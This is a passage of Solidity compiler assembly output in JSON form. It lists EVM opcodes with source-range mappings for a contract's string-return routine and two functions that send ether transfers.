											"source": -1
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "tag",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "26"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "26"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "28"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "NOT",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "tag",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "RETURN",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "tag",
											"source": 3,
											"value": "7"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "tag",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5568,
											"end": 5726,
											"name": "STOP",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "tag",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5066,
											"end": 5076,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5079,
											"end": 5110,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 5096,
											"end": 5109,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 5096,
											"end": 5107,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 5096,
											"end": 5109,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5096,
											"end": 5109,
											"name": "tag",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 5096,
											"end": 5109,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5079,
											"end": 5095,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 5079,
											"end": 5110,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5079,
											"end": 5110,
											"name": "tag",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 5079,
											"end": 5110,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5066,
											"end": 5110,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5066,
											"end": 5110,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5115,
											"end": 5140,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5151,
											"end": 5153,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5115,
											"end": 5154,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5115,
											"end": 5154,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5168,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5177,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5159,
											"end": 5177,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "PUSH",
											"source": 3,
											"value": "8FC"
										},
										{
											"begin": 5178,
											"end": 5190,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 5178,
											"end": 5188,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 5178,
											"end": 5190,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5178,
											"end": 5190,
											"name": "tag",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 5178,
											"end": 5190,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "CALL",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "41"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "41"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5159,
											"end": 5191,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "tag",
											"source": 3,
											"value": "15"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6637,
											"end": 6650,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6657,
											"end": 6667,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 6670,
											"end": 6703,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 6688,
											"end": 6701,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 6688,
											"end": 6699,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 6688,
											"end": 6701,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6688,
											"end": 6701,
											"name": "tag",
											"source": 3,
											"value": "44"
										},
										{
											"begin": 6688,
											"end": 6701,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6670,
											"end": 6686,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 6670,
											"end": 6703,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6670,
											"end": 6703,
											"name": "tag",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 6670,
											"end": 6703,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6657,
											"end": 6703,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6657,
											"end": 6703,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6708,
											"end": 6733,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 6744,
											"end": 6746,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6708,
											"end": 6747,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6708,
											"end": 6747,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6758,
											"end": 6785,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6788,
											"end": 6805,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "45"
										},
										{
											"begin": 6788,
											"end": 6803,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 6788,
											"end": 6805,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6788,
											"end": 6805,
											"name": "tag",
											"source": 3,
											"value": "45"
										},
										{
											"begin": 6788,
											"end": 6805,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6758,
											"end": 6805,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6758,
											"end": 6805,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6810,
											"end": 6839,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6842,
											"end": 6863,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "47"
										},
										{
											"begin": 6842,
											"end": 6861,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "48"
										},
										{
											"begin": 6842,
											"end": 6863,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6842,
											"end": 6863,
											"name": "tag",
											"source": 3,
											"value": "47"
										},
										{
											"begin": 6842,
											"end": 6863,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6810,
											"end": 6863,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6810,
											"end": 6863,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6868,
											"end": 6897,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6900,
											"end": 6921,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "49"
										},
										{
											"begin": 6900,
											"end": 6919,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 6900,
											"end": 6921,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6900,
											"end": 6921,
											"name": "tag",
											"source": 3,
											"value": "49"
										},
										{
											"begin": 6900,
											"end": 6921,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6868,
											"end": 6921,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6868,
											"end": 6921,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6926,
											"end": 6952,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 6955,
											"end": 6971,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 6955,
											"end": 6969,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "52"
										},
										{
											"begin": 6955,
											"end": 6971,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6955,
											"end": 6971,
											"name": "tag",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 6955,
											"end": 6971,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6926,
											"end": 6971,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6926,
											"end": 6971,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 6991,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7000,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 6982,
											"end": 7000,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "PUSH",
											"source": 3,
											"value": "8FC"
										},
										{
											"begin": 7001,
											"end": 7013,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 7001,
											"end": 7011,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 7001,
											"end": 7013,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 7001,
											"end": 7013,
											"name": "tag",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 7001,
											"end": 7013,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "DUP9",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "CALL",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "55"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "55"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 6982,
											"end": 7014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7056,
											"end": 7069,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7071,
											"end": 7086,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7088,
											"end": 7103,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7105,
											"end": 7117,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7039,
											"end": 7118,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "56"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
